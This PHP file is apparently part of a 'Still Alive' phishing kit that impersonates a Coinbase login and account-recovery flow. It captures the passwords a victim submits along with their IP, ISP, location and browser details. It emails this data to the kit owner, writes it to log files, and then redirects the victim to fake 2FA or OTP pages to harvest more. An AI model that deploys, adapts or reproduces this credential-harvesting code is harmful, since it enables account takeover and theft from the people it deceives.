<?php
/*
 ____    __         ___    ___       ______   ___                          
/\  _`\ /\ \__  __ /\_ \  /\_ \     /\  _  \ /\_ \    __                   
\ \,\L\_\ \ ,_\/\_\\//\ \ \//\ \    \ \ \L\ \\//\ \  /\_\  __  __     __   
 \/_\__ \\ \ \/\/\ \ \ \ \  \ \ \    \ \  __ \ \ \ \ \/\ \/\ \/\ \  /'__`\ 
   /\ \L\ \ \ \_\ \ \ \_\ \_ \_\ \_   \ \ \/\ \ \_\ \_\ \ \ \ \_/ |/\  __/ 
   \ `\____\ \__\\ \_\/\____\/\____\   \ \_\ \_\/\____\\ \_\ \___/ \ \____\
    \/_____/\/__/ \/_/\/____/\/____/    \/_/\/_/\/____/ \/_/\/__/   \/____/

 * @Facebook: https://www.facebook.com/ownerstillalive/
*/
session_start();
error_reporting(0);
require "../function.php";
require "../config.php";
$_SESSION['password'] = $_POST['password'];
$_SESSION['newpassword'] = $_POST['newpassword'];

$from = $senderemail;
$headers = "From: $senderlogin <$from>";
$subject = "Coinbase Login [ $ip - $cn - $br - $os ]";
$to = $stillalive;
$data = "
.++======[ Coinbase Login - Powered By Still Alive ]======++.

    .++=====[ Coinbase ]=====++.
New Password    :   ".$_POST['password']."
Re-new Password        :   ".$_POST['newpassword']."
        .++===[ End ]===++.

    .++=====[ PC Info ]=====++.
IP Address  :   $ip
ISP         :   $isp
Region      :   $regioncity
City        :   $citykota
Continent   :   $continent
OS/Browser  :   $br / $os On $date
User Agent  :   $user_agent
        .++===[ End ]===++.

.++======[ Powered By Still Alive - Coinbase Login ]======++.
";
mail($to,$subject,$data,$headers);
$empas   = "".$_SESSION['newpassword']."|".$_SESSION['password']."|$cn\n";
$file1 = "../logs/stillalive-newpassword.txt";
$isi1  = @file_get_contents($file1);
$buka1 = fopen($file1,"a");
fwrite($buka1, $empas);
fclose($buka1);
    
$file2 = "../logs/stillalive-login.txt";
$isi  = @file_get_contents($file2);
$buka = fopen($file2,"w"); 
fwrite($buka, $isi+1);
fclose($buka);
    
$cadangan = "../logs/login-info.txt";
$filecadangan = @fopen($cadangan, 'a+');
@fwrite($filecadangan, $data);
@fclose($filecadangan); //Cadangan kalo send username gak work
if($otpor2fa == "2fa"){
HEADER("Location: ../account_recovery/2fa");
}else if($otpor2fa == "otp"){
HEADER("Location: ../account_recovery/otp");
}else{
HEADER("Location: https://www.facebook.com/ownerstillalive/");
}
?>